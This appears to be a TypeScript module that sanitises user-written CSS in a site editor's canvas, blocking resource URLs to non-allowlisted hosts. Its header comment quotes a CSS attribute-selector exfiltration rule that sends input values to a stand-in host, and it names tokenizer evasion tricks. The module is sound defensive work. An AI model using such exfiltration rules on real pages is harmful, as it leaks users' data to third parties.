/**
 * Canvas-only guard for resource URLs in user-authored CSS.
 *
 * The editor canvas is not an iframe: Global CSS and the project's style rules
 * are `<style>` elements in the dashboard document, next to the signed-in
 * user's chrome. CSS that brings its own selectors can make the browser fetch
 * a URL per matching element — `input[value^="a"] { background: url(https://x/a) }`
 * — which leaks attribute values to whoever owns the host, and the dashboard
 * CSP allows `img-src https:` because image elements legitimately point
 * anywhere. So on the canvas, every reference to a host outside the allowlist
 * (`CANVAS_CSS_ASSET_HOSTS` + the media store's own host, `BLOB_STORE_HOST`)
 * and outside the page's origin, `data:` and `blob:`, becomes `data:,`.
 *
 * The CSS is read by a tokenizer that follows CSS Syntax §4 — comments,
 * strings (and bad strings), url tokens (and bad urls), escapes, numbers,
 * hashes, at-keywords, functions and nested blocks — so it sees the same
 * tokens the browser does: a `/*` inside a string, an escaped `\75 rl(`, or a
 * string or url left open at the end of the sheet cannot hide a reference.
 * Covered: url tokens, string arguments of `url()`, `src()`, `image()`,
 * `image-set()`, `cross-fade()` (and `-webkit-` forms), and `@import "…"`.
 * An escape inside a function name or at-keyword (never needed by real CSS)
 * drops the whole sheet.
 *
 * The published site is untouched — this runs only where CSS enters the
 * canvas (`useGlobalCustomCss`, StyleEngine's canvas sheet).
 *
 * @license BSD-3-Clause
 */

import { isSafeCssSelector } from "@buildrik/shared/schemas/element-markup";
import { CANVAS_CSS_ASSET_HOSTS } from "@/shared/constants/media";
import { BLOB_STORE_HOST } from "@/shared/utils/runtimeEnv";

const BLOCKED_URL = "data:,";
const FALLBACK_ORIGIN = "https://canvas.invalid";
const FETCH_FUNCTIONS = new Set([
  "url", "src", "image", "image-set", "-webkit-image-set", "cross-fade", "-webkit-cross-fade",
]);
/** A Vercel Blob public host: `<storeId>.public.blob.vercel-storage.com`. */
const BLOB_HOST_SHAPE = /^[a-z0-9]+\.public\.blob\.vercel-storage\.com$/;
const ELEMENT_ID_ATTRIBUTE = /\[data-buildrick-id="[A-Za-z0-9_-]+"\]/g;

export interface CanvasCssPolicy {
  /** The document the CSS runs in; relative URLs resolve against it. */
  origin?: string;
  /** Hosts allowed besides same-origin, `data:` and `blob:`. */
  hosts?: readonly string[];
  /**
   * Leave URLs alone inside a rule whose selector tests no attribute value —
   * only the product's selector grammar (`isSafeCssSelector`), with no `[…]`
   * but an element's own `[data-buildrick-id="…"]`. Such a rule can learn
   * nothing about the page it runs in, so a background the user pasted from
   * any host still shows. Only for StyleEngine's sheet, whose selectors the
   * product writes; Global CSS gets no exemption.
   */
  keepUrlsInAttributeFreeRules?: boolean;
}

/** The hosts canvas CSS may load from: the static list plus the media store. */
export function canvasCssAssetHosts(blobStoreHost: string | undefined = BLOB_STORE_HOST): readonly string[] {
  const host = blobStoreHost?.trim().toLowerCase();
  return host && BLOB_HOST_SHAPE.test(host) ? [...CANVAS_CSS_ASSET_HOSTS, host] : CANVAS_CSS_ASSET_HOSTS;
}

/**
 * Whether a URL (already unescaped) may load on the canvas: same-origin
 * (relative paths included), `data:`, `blob:`, or https on an allowed host.
 */
export function isCanvasCssUrlAllowed(value: string, origin: string, hosts: readonly string[]): boolean {
  const trimmed = value.trim();
  if (trimmed === "") return true;
  let url: URL;
  try {
    url = new URL(trimmed, origin);
  } catch {
    return false;
  }
  if (url.protocol === "data:" || url.protocol === "blob:") return true;
  if (url.origin === new URL(origin).origin) return true;
  return url.protocol === "https:" && hosts.includes(url.hostname);
}

function selectorTestsNoAttributes(prelude: string): boolean {
  const selector = prelude.trim();
  return isSafeCssSelector(selector) && !selector.replace(ELEMENT_ID_ATTRIBUTE, "").includes("[");
}

// ---------------------------------------------------------------------------
// Tokenizer (CSS Syntax Level 3, §4.3) — only as much as finding fetches needs.
// ---------------------------------------------------------------------------

const isNewline = (c: string | undefined) => c === "\n" || c === "\r" || c === "\f";
const isWs = (c: string | undefined) => c === " " || c === "\t" || isNewline(c);
const isDigit = (c: string | undefined) => c !== undefined && c >= "0" && c <= "9";
const isHex = (c: string | undefined) => c !== undefined && /^[0-9a-fA-F]$/.test(c);
const isNameStart = (c: string | undefined) =>
  c !== undefined && (/^[A-Za-z_]$/.test(c) || c.charCodeAt(0) >= 0x80);
const isName = (c: string | undefined) => isNameStart(c) || isDigit(c) || c === "-";
const isNonPrintable = (c: string) => {
  const code = c.charCodeAt(0);
  return code <= 0x08 || code === 0x0b || (code >= 0x0e && code <= 0x1f) || code === 0x7f;
};
const asciiLower = (s: string) => s.replace(/[A-Z]/g, (c) => c.toLowerCase());

type Token =
  | { type: "string"; value: string; start: number; end: number }
  | { type: "url"; value: string; start: number; end: number }
  | { type: "function"; name: string; escaped: boolean }
  | { type: "at"; name: string; escaped: boolean }
  | { type: "open"; close: ")" | "]" | "}"; at: number }
  | { type: "close"; char: ")" | "]" | "}"; at: number }
  | { type: "semicolon"; at: number }
  | { type: "ws" }
  | { type: "other" }
  | { type: "malformed" };

class Tokenizer {
  i = 0;
  /** A bad string, bad url, or a string/url/comment left open at the end. */
  malformed = false;
  constructor(private readonly s: string) {}

  private validEscape(at: number): boolean {
    return this.s[at] === "\\" && !isNewline(this.s[at + 1]);
  }

  private startsIdent(at: number): boolean {
    const c = this.s[at];
    if (c === "-") return isNameStart(this.s[at + 1]) || this.s[at + 1] === "-" || this.validEscape(at + 1);
    return isNameStart(c) || this.validEscape(at);
  }

  private startsNumber(at: number): boolean {
    const c = this.s[at];
    if (c === "+" || c === "-") {
      return isDigit(this.s[at + 1]) || (this.s[at + 1] === "." && isDigit(this.s[at + 2]));
    }
    return isDigit(c) || (c === "." && isDigit(this.s[at + 1]));
  }

  /** At the code point after `\`. */
  private escape(): string {
    const s = this.s;
    if (this.i >= s.length) return "�";
    if (isHex(s[this.i])) {
      let hex = "";
      while (hex.length < 6 && isHex(s[this.i])) hex += s[this.i++];
      if (s[this.i] === "\r" && s[this.i + 1] === "\n") this.i += 2;
      else if (isWs(s[this.i])) this.i++;
      const code = parseInt(hex, 16);
      const valid = code !== 0 && code <= 0x10ffff && (code < 0xd800 || code > 0xdfff);
      return String.fromCodePoint(valid ? code : 0xfffd);
    }
    const ch = String.fromCodePoint(s.codePointAt(this.i) ?? 0xfffd);
    this.i += ch.length;
    return ch;
  }

  private name(): { name: string; escaped: boolean } {
    let name = "";
    let escaped = false;
    for (;;) {
      const c = this.s[this.i];
      if (isName(c)) {
        name += c;
        this.i++;
      } else if (this.validEscape(this.i)) {
        this.i++;
        name += this.escape();
        escaped = true;
      } else {
        return { name, escaped };
      }
    }
  }

  private string(quote: string): Token {
    const s = this.s;
    const start = this.i - 1;
    let value = "";
    while (this.i < s.length) {
      const c = s[this.i];
      if (c === quote) {
        this.i++;
        return { type: "string", value, start, end: this.i };
      }
      if (isNewline(c)) {
        this.malformed = true; // bad string: the newline is not consumed
        break;
      }
      this.i++;
      if (c === "\\") {
        if (this.i >= s.length) continue;
        if (isNewline(s[this.i])) {
          this.i += s[this.i] === "\r" && s[this.i + 1] === "\n" ? 2 : 1;
        } else {
          value += this.escape();
        }
      } else {
        value += c;
      }
    }
    if (this.i >= s.length) this.malformed = true;
    return { type: "string", value, start, end: this.i };
  }

  private badUrlRemnants(): Token {
    this.malformed = true;
    while (this.i < this.s.length) {
      if (this.s[this.i] === ")") {
        this.i++;
        break;
      }
      if (this.validEscape(this.i)) {
        this.i++;
        this.escape();
      } else {
        this.i++;
      }
    }
    return { type: "malformed" };
  }

  /** After `url(` and its leading whitespace, at an unquoted URL. */
  private url(start: number): Token {
    const s = this.s;
    let value = "";
    while (isWs(s[this.i])) this.i++;
    while (this.i < s.length) {
      const c = s[this.i];
      if (c === ")") {
        this.i++;
        return { type: "url", value, start, end: this.i };
      }
      if (isWs(c)) {
        while (isWs(s[this.i])) this.i++;
        if (this.i >= s.length || s[this.i] === ")") continue;
        return this.badUrlRemnants();
      }
      if (c === '"' || c === "'" || c === "(" || isNonPrintable(c)) return this.badUrlRemnants();
      if (c === "\\") {
        if (!this.validEscape(this.i)) return this.badUrlRemnants();
        this.i++;
        value += this.escape();
        continue;
      }
      value += c;
      this.i++;
    }
    this.malformed = true;
    return { type: "url", value, start, end: this.i }; // open at EOF: still fetched
  }

  private identLike(start: number): Token {
    const { name, escaped } = this.name();
    if (this.s[this.i] !== "(") return { type: "other" };
    this.i++;
    // An escaped function name (`\75 rl(`) is refused by the caller either way.
    if (escaped) return { type: "function", name: asciiLower(name), escaped };
    if (asciiLower(name) === "url") {
      let j = this.i;
      while (isWs(this.s[j])) j++;
      if (this.s[j] !== '"' && this.s[j] !== "'") return this.url(start);
    }
    return { type: "function", name: asciiLower(name), escaped };
  }

  private numeric(): Token {
    const s = this.s;
    if (s[this.i] === "+" || s[this.i] === "-") this.i++;
    while (isDigit(s[this.i])) this.i++;
    if (s[this.i] === "." && isDigit(s[this.i + 1])) {
      this.i++;
      while (isDigit(s[this.i])) this.i++;
    }
    const e = s[this.i];
    if ((e === "e" || e === "E") && (isDigit(s[this.i + 1]) || ((s[this.i + 1] === "+" || s[this.i + 1] === "-") && isDigit(s[this.i + 2])))) {
      this.i += 2;
      while (isDigit(s[this.i])) this.i++;
    }
    if (this.startsIdent(this.i)) this.name(); // a unit: `10url(` is a dimension, not a function
    else if (s[this.i] === "%") this.i++;
    return { type: "other" };
  }

  next(): Token | null {
    const s = this.s;
    if (this.i >= s.length) return null;
    const start = this.i;
    const c = s[this.i];

    if (c === "/" && s[this.i + 1] === "*") {
      const end = s.indexOf("*/", this.i + 2);
      if (end === -1) this.malformed = true;
      this.i = end === -1 ? s.length : end + 2;
      return { type: "ws" };
    }
    if (isWs(c)) {
      while (isWs(s[this.i])) this.i++;
      return { type: "ws" };
    }
    if (c === '"' || c === "'") {
      this.i++;
      return this.string(c);
    }
    if (c === "#") {
      this.i++;
      if (isName(s[this.i]) || this.validEscape(this.i)) this.name();
      return { type: "other" };
    }
    if (c === "(" || c === "[" || c === "{") {
      this.i++;
      return { type: "open", close: c === "(" ? ")" : c === "[" ? "]" : "}", at: start };
    }
    if (c === ")" || c === "]" || c === "}") {
      this.i++;
      return { type: "close", char: c, at: start };
    }
    if (c === ";") {
      this.i++;
      return { type: "semicolon", at: start };
    }
    if (c === "<" && s.startsWith("<!--", this.i)) {
      this.i += 4;
      return { type: "other" };
    }
    if (c === "@") {
      this.i++;
      if (this.startsIdent(this.i)) {
        const { name, escaped } = this.name();
        return { type: "at", name: asciiLower(name), escaped };
      }
      return { type: "other" };
    }
    if (this.startsNumber(this.i)) return this.numeric();
    if (c === "-" && s[this.i + 1] === "-" && s[this.i + 2] === ">") {
      this.i += 3;
      return { type: "other" };
    }
    if (this.startsIdent(this.i)) return this.identLike(start);
    if (c === "\\") {
      // `\` + newline: a delim. (`\` + anything else started an ident above.)
      this.i++;
      return { type: "other" };
    }
    this.i += String.fromCodePoint(s.codePointAt(this.i) ?? 0).length;
    return { type: "other" };
  }
}

// ---------------------------------------------------------------------------

/** At-rule blocks whose rules match exactly what they would match unwrapped. */
const TRANSPARENT_AT_RULE = /^@(?:media|supports|layer)\b/i;

type Frame =
  | { kind: "block"; keep: boolean; transparent: boolean }
  | { kind: "paren"; close: ")" | "]"; fetches: boolean };

/**
 * `css` with every resource reference the canvas may not load replaced by
 * `data:,` — or `""` when a function name or at-keyword is spelled with an
 * escape. The saved CSS is not changed; this is what the canvas renders.
 */
export function blockForeignCssUrls(css: string, policy: CanvasCssPolicy = {}): string {
  if (!css) return css;
  const rawOrigin = policy.origin ?? globalThis.location?.origin;
  const origin = rawOrigin && rawOrigin !== "null" ? rawOrigin : FALLBACK_ORIGIN;
  const hosts = policy.hosts ?? canvasCssAssetHosts();
  const allowed = (value: string) => isCanvasCssUrlAllowed(value, origin, hosts);

  const edits: Array<{ start: number; end: number; text: string }> = [];
  const stack: Frame[] = [];
  let preludeStart = 0; // where the current rule's prelude began, at this block level
  let pendingImport = false;
  const tokens = new Tokenizer(css);

  const innermostBlock = () => {
    for (let k = stack.length - 1; k >= 0; k--) {
      const frame = stack[k];
      if (frame.kind === "block") return frame;
    }
    return undefined;
  };
  const inFetchFunction = () => {
    for (let k = stack.length - 1; k >= 0; k--) {
      const frame = stack[k];
      if (frame.kind === "block") return false;
      if (frame.fetches) return true;
    }
    return false;
  };
  const kept = () => innermostBlock()?.keep === true;

  for (let token = tokens.next(); token; token = tokens.next()) {
    if (token.type === "ws") continue;
    const importTarget = pendingImport;
    pendingImport = false;

    switch (token.type) {
      case "url":
        if (!kept() && !allowed(token.value)) edits.push({ ...token, text: `url(${BLOCKED_URL})` });
        break;
      case "string":
        if ((importTarget || inFetchFunction()) && !kept() && !allowed(token.value)) {
          edits.push({ ...token, text: `"${BLOCKED_URL}"` });
        }
        break;
      case "function":
        if (token.escaped) return "";
        stack.push({ kind: "paren", close: ")", fetches: FETCH_FUNCTIONS.has(token.name) });
        break;
      case "at":
        if (token.escaped) return "";
        pendingImport = token.name === "import";
        break;
      case "open":
        if (token.close === "}") {
          const prelude = css.slice(preludeStart, token.at).trim();
          const inParens = stack.length > 0 && stack[stack.length - 1].kind === "paren";
          /* Kept only when every enclosing block is kept or a transparent
             at-rule: a nested `.x` inside `input[value^=a] { … }` means
             `input[value^=a] .x`. */
          const enclosingOk = stack.every((f) => f.kind !== "block" || f.keep || f.transparent);
          const keep =
            !inParens && enclosingOk && policy.keepUrlsInAttributeFreeRules === true && selectorTestsNoAttributes(prelude);
          stack.push({ kind: "block", keep, transparent: !inParens && TRANSPARENT_AT_RULE.test(prelude) });
          preludeStart = token.at + 1;
        } else {
          stack.push({ kind: "paren", close: token.close, fetches: false });
        }
        break;
      case "close": {
        const top = stack[stack.length - 1];
        const matches =
          top !== undefined && (top.kind === "block" ? token.char === "}" : token.char === top.close);
        if (!matches) break; // a stray closer is an ordinary token
        stack.pop();
        if (top.kind === "block") preludeStart = token.at + 1;
        break;
      }
      case "semicolon":
        if (stack.length === 0 || stack[stack.length - 1].kind === "block") preludeStart = token.at + 1;
        break;
      default:
        break;
    }
  }

  /* The exemption leans on reading block structure right; a sheet the browser
     has to repair (bad or unterminated tokens, unclosed blocks) gets none. */
  if (policy.keepUrlsInAttributeFreeRules && (tokens.malformed || stack.length > 0)) {
    return blockForeignCssUrls(css, { ...policy, keepUrlsInAttributeFreeRules: false });
  }

  let out = "";
  let cursor = 0;
  for (const { start, end, text } of edits) {
    out += css.slice(cursor, start) + text;
    cursor = end;
  }
  return out + css.slice(cursor);
}
